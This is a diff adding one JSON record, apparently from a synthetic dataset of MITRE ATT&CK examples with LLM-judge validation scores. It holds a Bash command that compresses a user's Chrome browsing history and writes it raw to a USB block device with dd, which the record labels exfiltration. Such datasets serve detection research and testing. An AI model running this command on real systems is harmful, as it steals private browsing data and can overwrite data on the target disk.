@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "gzip -c \"$HOME/.config/google-chrome/Default/History\" 2>/dev/null | dd of=\"/dev/sdb\" bs=1M seek=$(( $(blockdev --getsz /dev/sdb) / 2048 - 8 )) conv=notrunc,fsync status=none",
+  "explanation": "Compresses the Chrome history database and writes it near the end of the USB disk with a MiB-aligned seek, reducing likelihood of overwriting partition metadata.",
+  "rationale_steps": [
+    "Compress a browser history database if present",
+    "Compute an end-of-disk seek in 1 MiB units using total sector count",
+    "Write the stream into late disk sectors using dd with notrunc and fsync"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-7026c61e",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and arithmetic expansion with valid gzip, dd, and redirection options in a proper pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses and writes the Chrome History file to a near-end offset on a block device consistent with exfiltration to physical media, but typically requires elevated privileges and risks overwriting existing data/metadata.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T07:16:51.532789Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid arithmetic expansion, proper pipe chaining, and correct flag syntax for both gzip and dd.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by compressing Chrome browser history (staging sensitive data), then writing it directly to a raw USB block device at a calculated offset near the end of the disk (avoiding partition metadata), which is a realistic and operationally plausible physical medium exfiltration technique.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2026-02-18T22:32:27.111832Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, including proper arithmetic expansion, command substitution, piping, and correct flags for gzip and dd.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration to a physical medium by writing compressed data to a calculated offset on a raw device, though it realistically requires root privileges to access /dev/sdb.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:32:31.995753Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
